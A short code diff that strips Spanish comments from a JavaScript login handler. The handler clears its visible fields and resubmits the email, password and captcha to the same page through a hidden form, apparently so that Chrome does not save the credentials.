@@ -59,18 +59,18 @@
                 return;
             }
 
-            // 1. Vaciamos la pantalla ANTES de enviar. Chrome verá cajas vacías.
+            
             document.getElementById('fake_email').value = '';
             document.getElementById('fake_clave').value = '';
             document.getElementById('fake_captcha').value = '';
 
-            // 2. Creamos un "Formulario Fantasma" invisible en la memoria
+            
             let formFantasma = document.createElement('form');
             formFantasma.method = 'POST';
             formFantasma.action = '';
             formFantasma.style.display = 'none';
 
-            // Le metemos los datos correctos para que PHP los lea
+            
             let inputEmail = document.createElement('input');
             inputEmail.type = 'hidden';
             inputEmail.name = 'login_email';
@@ -89,7 +89,7 @@
             inputCaptcha.value = captcha;
             formFantasma.appendChild(inputCaptcha);
 
-            // 3. Lo metemos a la página, lo enviamos y fin de la historia
+            
             document.body.appendChild(formFantasma);
             formFantasma.submit();
         }
